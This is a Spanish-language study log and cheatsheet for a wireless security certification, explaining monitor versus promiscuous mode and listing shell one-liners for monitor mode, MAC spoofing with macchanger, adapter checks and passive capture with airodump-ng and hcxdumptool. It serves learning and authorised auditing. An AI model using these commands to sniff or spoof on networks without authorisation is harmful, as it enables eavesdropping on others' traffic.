<!-- 

Y ARRANCAN!!!


<p align="center"> <img src="solo el link" alt="Mac" height=600px/> </a> </p> 

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/223137182-929a5e71-1b1f-48c4-94b4-1553a386fefa.png" alt="Mac" height=600px/> </a> </p> 

 -->

# Hacia el Infierno del `OSWP`: <br> `Offensive Security Wireless Professional` 📡🦈💀  

![image](https://github.com/Fz3r0/Fz3r0_-_BlackShark/assets/94720207/7c94fd0b-296e-4884-a604-c6db7c386ca6) <br>
_Writeup y bitácora para la certificación **CWAP-402** de **CWNP (Certified Wireless Network Professional)**_ <br>
_por @ **Fz3r0 💀** (CWNA)_


## 🗂️ `ÍNDICE`

### 👹 `CANTO I`: Introducción

### 👹 `CANTO II`: Monitor Mode
- ⭕ [**Promiscous Mode**]()
- ⭕ [**Monitor Mode**]() <br><br>
- 💀📝 [**`Fz3r0 Cheatsheet`: ON/OFF Adapter & Network Services**]()
    - 🕵️📡 [ON/OFF Adapter: `x1 Adapter`]()
    - 🕵️📡 [ON/OFF Adapter: `x3 Adapters`]() <br><br>
- 💀📝 [**`Fz3r0 Cheatsheet`: Adapter Modes**]()
    - 🕵️📡 [Monitor Mode Activation: `x1 Adapter`]()
    - 🕵️📡 [Monitor Mode Activation: `x3 Adapters`]() 
    - 🕵️📡 [Managed Mode Activation: `x1 Adapter`]()
    - 🕵️📡 [Managed Mode Activation: `x3 Adapters`]() 
    - 🕵️📡 [Ad-Hoc Mode Activation: `x1 Adapter`]()
    - 🕵️📡 [Ad-Hoc Mode Activation: `x3 Adapters`]() <br><br>
- 💀📝 [**`Fz3r0 Cheatsheet`: Validation**]()
    - ❓📡 [Validation: `x1 Adapter`]() 
    - ❓📡 [Validation: `Multiple Adapters`]()
    - ❓✅ [Validation: `Less is More`]()
    - ❓📖 [Validation: `Full Bibles`]() <br><br> 
- 💀📝 [**`Fz3r0 Cheatsheet`: Channel Selection**]()
    - ⚟📡 [Channel Selection: `x1 Adapter`]() 
    - ⚟📡 [Channel Selection: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: Band Selection**]()
    - 📻📡 [Channel Selection: `x1 Adapter`]() 
    - 📻📡 [Channel Selection: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: IEEE Standard Selection**]()
    - 👨‍🚀📡 [Channel Selection: `x1 Adapter`]() 
    - 👨‍🚀📡 [Channel Selection: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: Modulation**]()
    - 👨‍🚀📡 [Modulation: `x1 Adapter`]() 
    - 👨‍🚀📡 [Modulation: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: Data Rate Adjust**]()
    - 👨‍🚀📡 [Data Rate Adjust: `x1 Adapter`]() 
    - 👨‍🚀📡 [Data Rate Adjust: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: Tx Gain Adjust**]()
    - 🎚️📡 [Channel Selection: `x1 Adapter`]() 
    - 🎚️📡 [Channel Selection: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: MAC Spoofing**]()
    - 🥸♻️ [WLAN Audit: `x1 Adapter`]() 
    - 🥸♻️ [WLAN Audit: `x3 Adapters`]() <br><br>  
- 💀📝 [**`Fz3r0 Cheatsheet`: WLAN Passive Audit**]()
    - 🥷🔎 [WLAN Audit: `x1 Adapter`]() 
    - 🥷🔎 [WLAN Audit: `x3 Adapters`]() <br><br>  




### CANTO III: Monitor Mode


iwlist modulation


## AVISO: Antes de montar cualquier cosa!!!

- Para estos laboratiorios recomiendo personalmente el Driver Atheros 

    - SOLO USAR LOS SIGUIENTES MODELOS EN ESPECÍFICO DE ADAPTADORES WIRELESS POR EL MOMENTO (INICIOS 2023), LOS DEMÁS TRAERÁS UN DETALLE U OTRO:

        1. [Alfa Awus036nha 150 Mbps - 2.4 Ghz - USB](https://www.amazon.com.mx/gp/product/B004Y6MIXS/ref=ox_sc_act_title_1?smid=A34CQGRPXZBGVX&psc=1)
        2. [Panda Wireless PAU06 300Mbps N USB Adapter](https://www.amazon.com.mx/gp/product/B00JDVRCI0/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1) 
        3. [_Por confirmar uno que funcione bien en 5 GHz_]()

- Otra fuente de lo que me refiero es este gran ejemplo de David Bombal: https://www.youtube.com/watch?v=hEXwOkyYNL0
- Hay cientos y cientos de foros y páginas con soluciones a medias, pero al final nunca queda al 100%...
- Advertidos están!



































# 👹 `CANTO II:`  Monitor Mode

Las comunicaciones 802.11 Wireless y las 802.3 Ethernet, aunque similares, no son iguales. Por ejemplo, no hay un puerto solo del plano de `management` en un switch al cual conectarse y simplemente capturar cada `frame` que se envía al medio.

El tráfico inalámbrico no se segmenta utilizando un switch como en Ethernet 802.3, pero si se puede segmentar, por ejemplo utilizando una frecuencia diferente, más comúnmente llamada "un canal". En Wireless las transmisiones están en el aire "volando" y no están contenidas dentro de un conjunto de cables, switches y routers. **Este es el claro ejemplo de la diferencia entre una `LAN (Ethernet / IEEE 802.3)` y una `WLAN (WiFi / IEEE 802.11)`**

Para capturar transmisiones inalámbricas o `802.11 Frames`, se debe utilizar software de análisis de protocolo o `Protocol Analyzer` y un adaptador de red inalámbrico o `Network Adapter` que funcione con el software, es decir, `hardware` y `software` capaz de capturar y procesar la captura de 802.11 Frames. 

El `Network Adapter` debe estar en `Monitor Mode`. El modo monitor significa que el adaptador inalámbrico se ha configurado para **capturar el tráfico que está destinado a cualquier dirección MAC y no solo a la suya.** Esto se logra mediante el uso de un `driver` requerido que funciona no solo con el adaptador sino también con su software de análisis de protocolo.

## 💀 `Monitor Mode` & `Promiscous Mode`

Es importante entender que `Monitor Mode` y `Promiscous Mode` no son los mismos conceptos. Para la captura de `Ethernet` solo necesita activar `Promiscous Mode`, sin embargo, para capturar `WiFi` es más complejo y se necesita utilizar tanto `Monitor Mode` y `Promiscous Mode`.

### ⭕ `Promiscous Mode`

**Este modo se debe tener encendido siempre que se quiera capturar frames, ya sea `Ethernet` o `WiFi`** _(De hecho los sniffers como Wireshark lo tienen activado por default)_. Es un modo en el que un adaptador de red `inalámbrico` o `cableado` se configura para capturar todos los paquetes que se envían en la red, **independientemente de si están destinados al adaptador o no.** Esto significa que, **en el `Promiscuous Mode`, se pueden capturar paquetes que no están destinados a nuestro dispositivo**, lo que es útil para el análisis de red. 

El `Promiscuous Mode` permite a una interfaz o adaptador de red **"escuchar"** todo el tráfico que pasa por una interfaz _(puede ser Ethernet o una antena WiFi)_, aunque no esté dirigido específicamente a ese dispositivo o aunque no se pertenezca a esa subnet o VLAN, mientras haya tráfico pasando por esa interfaz se podrá escuchar. 

- **`IMPORTANTE`**: NO se puede usar el modo promiscuo para capturar `tráfico unicast` entre dos dispositivos que no son el dispositivo en modo promiscuo, ya que ese determinado tráfico no se transmite directamente por la interfaz donde se está escuchando, sino que en otras 2 interfaces aparte que están transmitiendo unicast ya sea por medio de un switch o directamente peer-to-peer (punto a punto), ya que es la "conversación" unicast entre 2 dispositivos ajenos.**

Existen diferencias de `Modo` entre capturar en WiFi o Ethernet:

- Para capturar `Ethernet 802.3` solo es necesario conectar el cable ethernet a la interfaz, encender `Promiscous Mode` y ya se podrá capturar tráfico ¡Así de fácil!
- Para capturar `WiFi 802.11` es un poco más complejo, ya que además de tener activado el `Promiscous Mode`, se necesitan herramientras de hardware adicional, también se deben confgurar los drivers para una función diferente, como el `Monitor Mode`. Tanto el Sistema Operativo, Hardware _(adaptadores WiFi)_ y Software _(Protocol Analyzers & Sniffers)_ deben ser compatibles con `Monitor Mode`

---

### ⭕ `Monitor Mode`

Es un modo especial en el que un adaptador de red inalámbrico se configura para capturar todo el tráfico de la red inalámbrica, incluyendo los paquetes dirigidos a direcciones MAC que no sean la del adaptador en sí _(Similar al concepto del `Promiscous Mode` pero en Wireless, ¡pero el `Promiscous Mode` sigue siendo requerido!)_

En otras palabras, en Monitor Mode, el adaptador de red inalámbrico captura todos los paquetes que se envían en la red inalámbrica, independientemente de si están destinados al adaptador o no. **Esto permite capturar paquetes que no están destinados a nuestro dispositivo, lo que es útil para analizar todo el tráfico de la red inalámbrica, incluyendo el tráfico que no está dirigido directamente a nuestro dispositivo.**

Es decir, si queremos capturar todos los frames que se envían en una red inalámbrica, necesitamos usar un adaptador de red inalámbrico WiFi 802.11 en Monitor Mode. Por otro lado, si queremos capturar todos los paquetes que se envían en una red cableada Ethernet 802.3, podemos usar un adaptador de red cableado en Promiscuous Mode. Sin embargo, si queremos capturar todos los paquetes que se envían en una red mixta inalámbrica y cableada, necesitaríamos usar tanto un adaptador de red inalámbrico en Monitor Mode como un adaptador de red cableado en Promiscuous Mode para asegurarnos de capturar todos los paquetes.

Hay que recordar que, el tráfico WiFi en el aire puede ser capturado por cualquiera que esté a su alcance y tenga las herramientas adecuadas _(por ello la importancia de la encriptación y otros procesos de seguridad)_

![image](https://user-images.githubusercontent.com/94720207/231614242-d43e9592-73e2-4a22-9417-b8d8e630fdd6.png)

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

## 💀 `Fz3r0 Cheatsheet`: ON/OFF Adapter & Network Services

````sh
# Opcional para kill
airmon-ng check kill

# Opcional para tener internet
systemctl stop NetworkManager.service

# Opcional para detener wpa_suplicant
systemctl stop wpa_suplicant.service

# Opcional para detener Network manager
systemctl start NetworkManager.service
````

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>


## 💀 `Fz3r0 Cheatsheet`: Monitor Mode

````sh
# Monitor Mode: airmon
airmon-ng start wlan0

# Monitor Mode: iw
iw wlan0 set monitor control

# Monitor Mode: iwconfig
iwconfig wlan0 mode monitor
````

### 🕵️📡 Monitor Mode Activation: `x1 Adapter`

````sh
# Activando Monitor Mode en un adaptador Fresh (wlan0) 
clear; airmon-ng start wlan0; iwconfig wlan0mon channel 6 && ifconfig wlan0mon down; macchanger --mac=f0:f0:f0:f0:f0:f0 wlan0mon; ifconfig wlan0mon up && clear; echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m"; echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m"; echo ""; echo -e "\033[97m--- SYSTEM:\033[0m"; echo ""; echo -e "\033[32m$(uname -a)\033[0m"; echo ""; echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nMonitor Mode:%33s\033[0m" "Present" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi && echo "" ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m"; echo ""; echo -e "\033[36m$(ifconfig)\033[0m"; echo ""; echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions'; iw dev

# Activando Monitor Mode en un adaptador ya en Monitor Mode (wlan0mon) 
clear; airmon-ng start wlan0mon; iwconfig wlan0mon channel 6 && ifconfig wlan0mon down; macchanger --mac=f0:f0:f0:f0:f0:f0 wlan0mon; ifconfig wlan0mon up && clear; echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m"; echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m"; echo ""; echo -e "\033[97m--- SYSTEM:\033[0m"; echo ""; echo -e "\033[32m$(uname -a)\033[0m"; echo ""; echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nMonitor Mode:%33s\033[0m" "Present" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi && echo "" ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m"; echo ""; echo -e "\033[36m$(ifconfig)\033[0m"; echo ""; echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions'; iw dev

# Activando Monitor Mode en un adaptador Fresh (wlan0) = TP-Link (Siempre se llama wlan0) 
# Primero instalar driver: apt install -y realtek-rtl8188eus-dkms
clear; airmon-ng start wlan0; iwconfig wlan0 channel 6 && ifconfig wlan0 down; macchanger --mac=f0:f0:f0:f0:f0:f0 wlan0; ifconfig wlan0 up && clear; echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m"; echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m"; echo ""; echo -e "\033[97m--- SYSTEM:\033[0m"; echo ""; echo -e "\033[32m$(uname -a)\033[0m"; echo ""; echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nMonitor Mode:%33s\033[0m" "Present" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi && echo "" ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m"; echo ""; echo -e "\033[36m$(ifconfig)\033[0m"; echo ""; echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions'; iw dev
````

---

### 🕵️📡📡📡 Monitor Mode Activation: `x3 Adapters`

- Triple encendido con **diferentes** canales `1,6,11`

````sh
# Triple encendido de Adaptadores desde 0 (wlan0) 
# [Channels: 1, 6, 11]
clear;airmon-ng start wlan0; airmon-ng start wlan1; airmon-ng start wlan2 && iwconfig wlan0mon channel 1 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 11 && ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up && clear; echo -e "\033[31m[+] AIR-SHARK by Fz3r0 💀 - Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo ""; echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 1 | CHANNEL 6 | CHANNEL 11] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev

# Triple encendido de Adaptadores ya en Monitor (wlan0mon)
# [Channels: 1, 6, 11]
clear;airmon-ng start wlan0mon; airmon-ng start wlan1mon; airmon-ng start wlan2mon && iwconfig wlan0mon channel 1 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 11 && ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up && clear; echo -e "\033[31m[+] AIR-SHARK by Fz3r0 💀 - Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo ""; echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 1 | CHANNEL 6 | CHANNEL 11] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````

- Triple encendido con **mismos** canales `6,6,6`

````sh
# Triple encendido de Adaptadores desde 0 (wlan0) 
# [Channels: 6, 6, 6]
clear;airmon-ng start wlan0; airmon-ng start wlan1; airmon-ng start wlan2 && iwconfig wlan0mon channel 6 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 6 && ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up && clear; echo -e "\033[31m[+] AIR-SHARK by Fz3r0 💀 - Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo ""; echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 6 | CHANNEL 6 | CHANNEL 6] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev

# Triple encendido de Adaptadores ya en Monitor (wlan0mon)
# [Channels: 6, 6, 6]
clear;airmon-ng start wlan0mon; airmon-ng start wlan1mon; airmon-ng start wlan2mon && iwconfig wlan0mon channel 6 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 6 && ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up && clear; echo -e "\033[31m[+] AIR-SHARK by Fz3r0 💀 - Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo ""; echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 6 | CHANNEL 6 | CHANNEL 6] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

## 💀 `Fz3r0 Cheatsheet`: Validation 

### ❓📡 Verification: `x1 Adapter`

````sh
## [+] Fz3r0 Wireless IEEE 802.11 (WiFi) Validation v1.0 : opcion con Bus /002/002 (Default)
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m";echo "";echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nDriver Manufacturer:%27s\nMonitor Mode:%33s\033[0m\n" "Present" "$(lsusb -D /dev/bus/usb/002/002 2>/dev/null | grep "iManufacturer" | awk '{print $3}')" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[35m$(lsusb | grep -E "^Bus (00[2-9]|[1-9][0-9]*)")\033[0m";echo "";echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m";echo "";echo -e "\033[36m$(ifconfig)\033[0m";echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m";echo "";iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev

## [+] Fz3r0 Wireless IEEE 802.11 (WiFi) Validation v1.0 : opcion con Bus /002/003 (Varios)
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m";echo "";echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nDriver Manufacturer:%27s\nMonitor Mode:%33s\033[0m\n" "Present" "$(lsusb -D /dev/bus/usb/002/003 2>/dev/null | grep "iManufacturer" | awk '{print $3}')" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[35m$(lsusb | grep -E "^Bus (00[2-9]|[1-9][0-9]*)")\033[0m";echo "";echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m";echo "";echo -e "\033[36m$(ifconfig)\033[0m";echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m";echo "";iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev


## Final resume
clear; echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m"; echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m"; echo ""; echo -e "\033[97m--- SYSTEM:\033[0m"; echo ""; echo -e "\033[32m$(uname -a)\033[0m"; echo ""; echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m"; echo ""; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%25s\nMonitor Mode:%33s\033[0m" "Present" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%25s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%33s\033[0m" "Present" "Inactive"; fi && echo "" ; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m"; echo ""; echo -e "\033[36m$(ifconfig)\033[0m"; echo ""; echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions'; iw dev
````

---

### ❓📡📡📡 Verification: `Multiple Adapters`

````sh
# [+] Fz3r0 Wireless IEEE 802.11 (WiFi) Validation v1.0 : Physical Adapters
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m"; echo "";echo -e "\033[97m--- PHYSICAL INTERFACES:\033[0m";echo "";echo -e "\033[36m$(ifconfig)\033[0m";echo "";

# [+] Fz3r0 Wireless IEEE 802.11 (WiFi) Validation v1.0 : Wireless Adapters
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m";echo "";iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````

---

### ❓✅ Verification: `Less is More`

````sh
# armon-ng GOD: Muestra las interfaces corto y claro I
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "" && echo -e "\033[32m$(airmon-ng)\033[0m"

# iw dev GOD: Muestra las interfaces corto y claro II
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "" && echo -e "\033[32m$(iw dev)\033[0m"

# GODs combined
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "" && echo -e "\033[32m$(airmon-ng)\033[0m" && echo -e ""; echo -e "\033[32m$(iw dev)\033[0m"


echo -e "\033[31m[+] AIR-SHARK by Fz3r0 💀 - Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo ""; echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 1 | CHANNEL 6 | CHANNEL 11] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m"; echo -e "\033[32m$(airmon-ng)\033[0m"; echo ""; iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````
---

### ❓📖 Verification: `Full Bibles`

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>



## 💀 `Fz3r0 Cheatsheet`: WLAN Audit

````sh
## Comenzar Auditoría en Channel Default
airodump-ng wlan0mon

## Comenzar Auditoría en channel 6
airodump-ng wlan0mon -c 6

## Comenzar Auditoría en channel 1,6,11 en varios adaptadores
airodump-ng wlan0mon,wlan1mon,wlan2mon -c 1,6,11

## Audit con hcxdumptool
hcxdumptool --do_rcascan -i wlan0mon
````

---

<div align="center">

┌═════════════════════┐<br>
